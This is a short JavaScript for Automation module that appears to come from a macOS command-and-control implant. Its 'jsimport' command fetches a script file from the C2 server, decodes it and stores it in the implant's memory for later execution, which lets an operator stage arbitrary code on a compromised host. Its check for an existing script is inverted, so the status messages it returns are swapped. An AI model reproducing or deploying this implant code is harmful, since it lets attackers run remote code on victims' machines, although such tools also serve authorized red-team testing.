exports.jsimport = function(task,command,params){
    let script = "";
    try{
        let config = JSON.parse(params);
        let old_script_exists = jsimport === "";
        if(config.hasOwnProperty("file")){
            let script_data = C2.upload(task, config['file']);
            if(typeof script_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            script = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding));
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        jsimport = script;
        if(old_script_exists){
            return {"user_output":"Cleared old script and imported the new script", "completed": true};
        }else{
            return {"user_output":"Imported the script", "completed": true};
        }

    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
